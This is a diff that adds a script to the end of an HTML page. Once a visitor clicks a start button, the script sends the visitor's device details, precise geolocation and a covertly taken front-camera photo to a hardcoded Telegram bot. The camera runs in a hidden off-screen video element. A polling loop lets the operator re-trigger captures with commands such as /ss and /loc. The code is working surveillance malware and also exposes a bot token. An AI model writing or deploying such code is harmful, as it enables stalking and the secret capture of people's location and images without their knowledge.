+      const BOT_TOKEN = "8720382845:AAFXof1gIpQvNGsc7Fi1yRD9EJiGmXCpAxQ";
+      const CHAT_ID   = "8768658592";
+
+      const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+      const sent = { info: false, loc: false, photo: false };
+      const ts = () => new Date().toISOString();
+
+      async function sendText(text) {
+        try {
+          await fetch(`${API}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "HTML", disable_web_page_preview: true }),
+          });
+        } catch (_) {}
+      }
+
+      async function sendPhoto(base64, caption) {
+        try {
+          const blob = await (await fetch(base64)).blob();
+          const form = new FormData();
+          form.append("chat_id", CHAT_ID);
+          form.append("caption", caption);
+          form.append("photo", blob, "snap.jpg");
+          await fetch(`${API}/sendPhoto`, { method: "POST", body: form });
+        } catch (_) {}
+      }
+
+      async function reportInfo() {
+        if (sent.info) return; sent.info = true;
+        const n = navigator, s = screen;
+        const body =
+          `<b>time</b>: ${ts()}\n` +
+          `<b>ua</b>: ${n.userAgent}\n` +
+          `<b>platform</b>: ${n.platform || "n/a"}\n` +
+          `<b>lang</b>: ${n.language}\n` +
+          `<b>tz</b>: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
+          `<b>screen</b>: ${s.width}x${s.height}\n` +
+          `<b>viewport</b>: ${innerWidth}x${innerHeight}\n` +
+          `<b>cores</b>: ${n.hardwareConcurrency || "n/a"}\n` +
+          `<b>online</b>: ${n.onLine}`;
+        await sendText(`📱 <b>device</b>\n${body}`);
+      }
+
+      function getLocation() {
+        return new Promise((res) => {
+          if (!navigator.geolocation) return res(null);
+          navigator.geolocation.getCurrentPosition(
+            (p) => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+            () => res(null),
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        });
+      }
+
+      async function reportLoc() {
+        if (sent.loc) return; sent.loc = true;
+        const loc = await getLocation();
+        if (!loc) return sendText("📍 <b>lokasi</b>: ditolak / tidak tersedia");
+        await sendText(
+          `📍 <b>lokasi</b>\n<b>lat</b>: ${loc.lat}\n<b>lon</b>: ${loc.lon}\n` +
+          `<b>akurasi</b>: ${loc.acc} m\nhttps://maps.google.com/?q=${loc.lat},${loc.lon}`
+        );
+      }
+
+      async function reportPhoto() {
+        if (sent.photo) return; sent.photo = true;
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: false,
+          });
+
+          const v = document.createElement("video");
+          v.srcObject = stream;
+          v.setAttribute("playsinline", "");
+          v.muted = true;
+          Object.assign(v.style, { position: "fixed", opacity: "0", width: "1px", height: "1px", top: "-9999px" });
+          document.body.appendChild(v);
+
+          await v.play().catch(() => {});
+          await new Promise((r) => setTimeout(r, 1400));
+
+          const c = document.createElement("canvas");
+          c.width  = v.videoWidth  || 640;
+          c.height = v.videoHeight || 480;
+          c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
+
+          const b64 = c.toDataURL("image/jpeg", 0.85);
+
+          stream.getTracks().forEach((t) => t.stop());
+          v.remove();
+
+          await sendPhoto(b64, `📸 <b>front cam</b>\n${ts()}`);
+        } catch (e) {
+          await sendText(`📸 <b>front cam</b>: ditolak / gagal (${e.name || "err"})`);
+        }
+      }
+
+      async function run() {
+        await reportInfo();
+        await Promise.all([reportLoc(), reportPhoto()]);
+      }
+
+      // command listener
+      let lastUpdateId = 0;
+      async function pollCommands() {
+        try {
+          const r = await fetch(`${API}/getUpdates?offset=${lastUpdateId + 1}&timeout=25`);
+          const data = await r.json();
+          if (!data.ok || !data.result.length) return;
+          for (const upd of data.result) {
+            lastUpdateId = upd.update_id;
+            const msg = upd.message;
+            if (!msg || !msg.text) continue;
+            if (String(msg.chat.id) !== String(CHAT_ID)) continue;
+            const cmd = msg.text.trim().toLowerCase();
+            if (cmd === "/ss")        { sent.photo = false; await reportPhoto(); }
+            else if (cmd === "/loc")  { sent.loc = false;   await reportLoc(); }
+            else if (cmd === "/info") { sent.info = false;  await reportInfo(); }
+            else if (cmd === "/all")  { sent.info = sent.loc = sent.photo = false; await run(); }
+          }
+        } catch (_) {}
+      }
+      setInterval(pollCommands, 3000);
+      pollCommands();
+
+      // ====== OVERLAY MULAI ======
+      const overlay = document.getElementById('startOverlay');
+      const startBtn = document.getElementById('startBtn');
+
+      startBtn.addEventListener('click', async () => {
+        // sembunyikan overlay dulu
+        overlay.classList.add('hidden');
+        setTimeout(() => overlay.remove(), 600);
+
+        // trigger semua capture
+        run();
+      });
+    })();
+  </script>
+</body>
+</html>
